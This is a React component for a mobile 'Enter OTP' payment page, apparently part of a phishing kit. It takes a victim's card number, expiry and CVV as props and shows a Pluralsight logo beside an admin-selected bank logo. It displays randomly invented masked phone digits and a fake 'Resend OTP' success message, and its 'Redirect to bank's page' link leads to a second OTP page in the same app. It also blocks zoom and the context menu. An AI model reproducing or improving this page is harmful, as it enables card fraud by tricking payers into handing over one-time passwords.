import React, { useState, useEffect } from 'react';

interface ThirdOTPPageProps {
  cardData: {
    cardNumber: string;
    expiryMonth: string;
    expiryYear: string;
    cvv: string;
    cardholderName: string;
  };
  otpValue: string;
  setOtpValue: (value: string) => void;
  otpSubmitting: boolean;
  handleOtpSubmit: () => void;
  handleOtpCancel: () => void;
  otpError: string;
  adminSelectedBankLogo: string | null;
  sessionBankLogo: string;
  cardBrandLogos: any;
  getCardBrand: (cardNumber: string) => string;
  onRedirectToSecondOTP?: () => void;
}

const ThirdOTPPage: React.FC<ThirdOTPPageProps> = ({
  cardData,
  otpValue,
  setOtpValue,
  otpSubmitting,
  handleOtpSubmit,
  handleOtpCancel,
  otpError,
  adminSelectedBankLogo,
  sessionBankLogo,
  cardBrandLogos,
  getCardBrand,
  onRedirectToSecondOTP
}) => {
  const [timeLeft, setTimeLeft] = useState(179); // 2:59 in seconds
  const [resendCount, setResendCount] = useState(0);
  const [resendCooldown, setResendCooldown] = useState(false);
  const [mobileLast4] = useState(() => Math.floor(1000 + Math.random() * 9000).toString());
  const [showResendSuccess, setShowResendSuccess] = useState(false);

  // Timer countdown effect
  useEffect(() => {
    const timer = setInterval(() => {
      setTimeLeft((prev) => {
        if (prev <= 1) {
          clearInterval(timer);
          window.location.href = '/payment-failed?error=timeout';
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, []);

  const resetTimer = () => {
    setTimeLeft(179); // 2:59
  };

  const formatTimer = (seconds: number): string => {
    const minutes = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${minutes}:${secs.toString().padStart(2, '0')}`;
  };

  const handleResendOTP = () => {
    if (resendCooldown || resendCount >= 3) {
      if (resendCount >= 3) {
        window.location.href = '/payment-failed?error=max_attempts';
      }
      return;
    }

    setResendCooldown(true);
    setResendCount(prev => prev + 1);
    
    setShowResendSuccess(true);
    setTimeout(() => setShowResendSuccess(false), 3000);
    
    resetTimer();
    
    setTimeout(() => {
      setResendCooldown(false);
    }, 30000);
  };

  const handleOTPInput = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, '').slice(0, 6);
    setOtpValue(value);
  };

  const handleSubmit = () => {
    if (otpValue.length >= 4 && otpValue.length <= 6) {
      handleOtpSubmit();
    }
  };

  const handleKeyPress = (e: React.KeyboardEvent) => {
    if (!/[0-9]/.test(e.key) && !['Backspace', 'Delete', 'Tab', 'Enter'].includes(e.key)) {
      e.preventDefault();
    }
    
    if (e.key === 'Enter' && otpValue.length >= 4) {
      handleSubmit();
    }
  };

  const currentBankLogo = adminSelectedBankLogo || sessionBankLogo || 'https://assets.stickpng.com/images/627ccb0a1b2e263b45696aa5.png';

  // Add CSS animation for spinner and prevent zoom
  useEffect(() => {
    const style = document.createElement('style');
    style.textContent = `
      @keyframes spin {
        0% { transform: translate(-50%, -50%) rotate(0deg); }
        100% { transform: translate(-50%, -50%) rotate(360deg); }
      }
    `;
    document.head.appendChild(style);

    // Prevent zoom on mobile devices
    const preventZoom = (e: Event) => {
      e.preventDefault();
    };

    const preventKeyboardZoom = (e: KeyboardEvent) => {
      if ((e.ctrlKey || e.metaKey) && (e.key === '+' || e.key === '-' || e.key === '0')) {
        e.preventDefault();
      }
    };

    const preventWheelZoom = (e: WheelEvent) => {
      if (e.ctrlKey || e.metaKey) {
        e.preventDefault();
      }
    };

    // Prevent touch-based zoom
    document.addEventListener('touchstart', preventZoom, { passive: false });
    document.addEventListener('touchmove', preventZoom, { passive: false });
    document.addEventListener('touchend', preventZoom, { passive: false });
    document.addEventListener('keydown', preventKeyboardZoom);
    document.addEventListener('wheel', preventWheelZoom, { passive: false });
    document.addEventListener('contextmenu', preventZoom);

    // Update viewport meta tag
    const viewport = document.querySelector('meta[name=viewport]');
    if (viewport) {
      viewport.setAttribute('content', 'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no');
    }

    return () => {
      document.head.removeChild(style);
      document.removeEventListener('touchstart', preventZoom);
      document.removeEventListener('touchmove', preventZoom);
      document.removeEventListener('touchend', preventZoom);
      document.removeEventListener('keydown', preventKeyboardZoom);
      document.removeEventListener('wheel', preventWheelZoom);
      document.removeEventListener('contextmenu', preventZoom);
    };
  }, []);

  return (
    <div className="fixed inset-0 bg-white z-50 overflow-auto" style={{
      fontFamily: "'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif",
      backgroundColor: '#f8f9fa',
      color: '#333',
      lineHeight: '1.5'
    }}>
      <div style={{
        maxWidth: '400px',
        margin: '0 auto',
        backgroundColor: 'white',
        minHeight: '100vh',
        position: 'relative',
        boxShadow: '0 0 20px rgba(0,0,0,0.1)',
        // Mobile responsive adjustments
        width: '100%',
        padding: '0 16px'
      }}>
        {/* Header */}
        <div style={{
          display: 'flex',
          alignItems: 'center',
          justifyContent: 'center',
          padding: window.innerWidth <= 768 ? '12px 8px' : '12px 20px',
          backgroundColor: 'white',
          position: 'relative'
        }}>
          <button 
            onClick={handleOtpCancel}
            disabled={otpSubmitting}
            style={{
              background: 'none',
              border: 'none',
              padding: '8px',
              cursor: otpSubmitting ? 'not-allowed' : 'pointer',
              color: '#333',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
              position: 'absolute',
              left: '20px',
              borderRadius: '8px'
            }}
          >
            <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
              <path d="M19 12H5M12 19L5 12L12 5" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
            </svg>
          </button>
          <div style={{
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            flex: 1,
            marginLeft: '48px',
            marginRight: '20px'
          }}>
            <img 
              src="https://www.dlt.com/sites/default/files/styles/product_logos_50h_/public/2019-09/PS_logo_V_color[1].png?itok=OaqX6HHg" 
              alt="Pluralsight" 
              style={{
                height: '64px',
                width: 'auto',
                objectFit: 'contain'
              }}
            />
          </div>
        </div>
        
        {/* Main Content */}
        <div style={{ padding: '16px 20px' }}>
          <h1 style={{
            fontSize: '22px',
            fontWeight: '600',
            textAlign: 'center',
            marginBottom: '20px',
            color: '#1a1a1a'
          }}>Enter OTP</h1>
          
          {/* Amount Section */}
          <div style={{
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            marginBottom: '40px',
            gap: '8px',
            paddingBottom: '24px',
            borderBottom: '1px solid #d5d5d5',
            position: 'relative',
            filter: 'drop-shadow(0 1px 2px rgba(0,0,0,0.1))'
          }}>
            <span style={{
              fontSize: '16px',
              color: '#666',
              fontWeight: '600'
            }}>Total Payable Amount </span>
            <span style={{
              fontSize: '16px',
              color: '#1a1a1a',
              fontWeight: '600'
            }}>₹2000</span>
            <div style={{ display: 'flex', alignItems: 'center', cursor: 'pointer' }}>
              <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
                <circle cx="8" cy="8" r="8" fill="#007AFF"/>
                <path d="M8 3.5V8.5M8 11.5H8.01" stroke="white" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round"/>
              </svg>
            </div>
          </div>

          {/* Bank Section */}
          <div style={{
            display: 'flex',
            flexDirection: 'column',
            alignItems: 'center',
            justifyContent: 'center',
            marginBottom: '24px',
            height: '120px',
            minHeight: '120px',
            maxHeight: '120px'
          }}>
            <div style={{
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
              height: '100%',
              width: '100%'
            }}>
              <img 
                src={currentBankLogo}
                alt="Bank Logo" 
                style={{
                  maxWidth: '80px',
                  maxHeight: '80px',
                  width: 'auto',
                  height: 'auto',
                  objectFit: 'contain',
                  display: 'block'
                }}
              />
            </div>
          </div>

          {/* OTP Instruction */}
          <div style={{
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            marginBottom: '24px',
            gap: '8px',
            fontSize: '14px',
            color: '#666',
            fontWeight: '600'
          }}>
            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" style={{
              marginRight: '2px',
              marginLeft: '2px',
              flexShrink: 0,
              transform: 'translateY(-1px)'
            }}>
              <rect x="6" y="3" width="12" height="18" rx="2" ry="2" fill="#666"/>
              <rect x="7" y="5" width="10" height="12" fill="white"/>
              <circle cx="12" cy="19" r="1" fill="white"/>
              <circle cx="16" cy="7" r="3" fill="#666"/>
              <rect x="14.5" y="6" width="3" height="2" rx="0.5" fill="white"/>
            </svg>
            <span style={{
              fontWeight: '600'
            }}>Enter OTP sent to ******{mobileLast4}</span>
          </div>

          {/* Resend Success Message */}
          {showResendSuccess && (
            <div style={{
              textAlign: 'center',
              marginBottom: '16px',
              color: '#34c759',
              fontSize: '14px',
              fontWeight: '500'
            }}>
              OTP sent successfully to ******{mobileLast4}
            </div>
          )}

          {/* OTP Input Section */}
          <div style={{ marginBottom: '24px' }}>
            <div style={{
              position: 'relative',
              width: '100%'
            }}>
              <input
                type="text"
                value={otpValue}
                onChange={handleOTPInput}
                onKeyPress={handleKeyPress}
                placeholder="Enter OTP"
                maxLength={6}
                disabled={otpSubmitting}
                style={{
                  width: '100%',
                  padding: '14px 16px',
                  paddingRight: '100px',
                  border: '1px solid #e5e5e5',
                  borderRadius: '4px',
                  fontSize: '16px',
                  backgroundColor: '#ffffff',
                  color: '#333',
                  transition: 'border-color 0.3s ease',
                  boxSizing: 'border-box',
                  outline: 'none'
                }}
              />
              <span 
                onClick={handleResendOTP}
                style={{
                  position: 'absolute',
                  right: '16px',
                  top: '50%',
                  transform: 'translateY(-50%)',
                  background: 'none',
                  border: 'none',
                  color: '#007AFF',
                  fontSize: '14px',
                  fontWeight: '400',
                  cursor: resendCooldown || resendCount >= 3 ? 'not-allowed' : 'pointer',
                  whiteSpace: 'nowrap',
                  textDecoration: 'none',
                  opacity: resendCooldown || resendCount >= 3 ? 0.5 : 1
                }}
              >
                Resend OTP
              </span>
            </div>
          </div>

          {/* Error message */}
          {otpError && (
            <div style={{
              textAlign: 'center',
              marginBottom: '16px',
              color: '#ff3b30',
              fontSize: '14px',
              fontWeight: '500'
            }}>
              {otpError}
            </div>
          )}

          {/* Confirm Button */}
          <button
            onClick={handleSubmit}
            disabled={otpSubmitting || otpValue.length < 4}
            style={{
              width: '100%',
              padding: '16px',
              background: (otpValue.length >= 4 && !otpSubmitting) ? '#3B82F6' : '#cccccc',
              color: (otpValue.length >= 4 && !otpSubmitting) ? 'white' : '#666666',
              border: 'none',
              borderRadius: '8px',
              fontSize: '16px',
              fontWeight: '600',
              letterSpacing: '1px',
              cursor: (otpValue.length >= 4 && !otpSubmitting) ? 'pointer' : 'not-allowed',
              marginBottom: '20px',
              transition: 'all 0.3s ease',
              textTransform: 'uppercase',
              position: 'relative'
            }}
          >
            {otpSubmitting ? (
              <>
                <span style={{ opacity: 0.3 }}>CONFIRM PAYMENT</span>
                <div style={{
                  position: 'absolute',
                  left: '50%',
                  top: '50%',
                  transform: 'translate(-50%, -50%)',
                  width: '20px',
                  height: '20px',
                  border: '2px solid #fff',
                  borderTop: '2px solid transparent',
                  borderRadius: '50%',
                  animation: 'spin 1s linear infinite'
                }} />
              </>
            ) : (
              'CONFIRM PAYMENT'
            )}
          </button>

          {/* Timer Section */}
          <div style={{
            textAlign: 'center',
            marginBottom: '24px',
            fontSize: '13px',
            color: '#666',
            fontWeight: '600'
          }}>
            <span>OTP will expire in </span>
            <span style={{
              color: '#ff3b30',
              fontWeight: '600'
            }}>{formatTimer(timeLeft)}</span>
            <span> minutes</span>
          </div>

          {/* Redirect Section */}
          <div style={{
            marginBottom: '32px',
            textAlign: 'center',
            padding: '0 20px'
          }}>
            <p style={{
              fontSize: '13px',
              color: '#666',
              lineHeight: '1.4'
            }}>
              You can always complete the transaction on your bank's website. 
              <a 
                href="#" 
                onClick={(e) => {
                  e.preventDefault();
                  onRedirectToSecondOTP?.();
                }}
                style={{
                  color: '#007AFF',
                  textDecoration: 'none',
                  fontWeight: '400',
                  cursor: 'pointer'
                }}>Redirect to bank's page</a>
            </p>
          </div>

          {/* Warning */}
          <div style={{
            textAlign: 'center',
            fontSize: '11px',
            color: '#999',
            fontWeight: '400',
            letterSpacing: '0.5px',
            marginBottom: '20px',
            marginTop: '8px'
          }}>
            DO NOT CLOSE OR REFRESH THE PAGE
          </div>
        </div>
      </div>
    </div>
  );
};

export default ThirdOTPPage;
